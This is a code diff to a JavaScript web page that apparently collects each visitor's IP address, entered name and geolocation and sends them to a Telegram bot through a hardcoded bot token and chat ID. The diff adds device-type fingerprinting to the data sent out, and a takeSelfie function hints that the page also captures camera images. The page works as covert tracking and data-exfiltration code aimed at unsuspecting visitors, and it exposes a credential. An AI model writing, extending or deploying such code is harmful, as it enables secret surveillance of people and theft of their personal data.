@@ -46,7 +46,8 @@
                         .then(response => response.json())
                         .then(locationData => {
                             var location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
-                            var data = `IP: ${ip}, Name: ${userName}, Location: ${location}`;
+                            var deviceName = getDeviceName();
+                            var data = `IP: ${ip}, Name: ${userName}, Device: ${deviceName}, Location: ${location}`;
                             var botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
                             var chatId = '5410457102';
                             fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
@@ -61,6 +62,19 @@
                             });
                         });
                 });
+        }
+
+        function getDeviceName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes('iPhone')) {
+                return 'iPhone';
+            } else if (userAgent.includes('iPad')) {
+                return 'iPad';
+            } else if (userAgent.includes('Android')) {
+                return 'Android';
+            } else {
+                return 'Unknown Device';
+            }
         }
 
         function takeSelfie() {
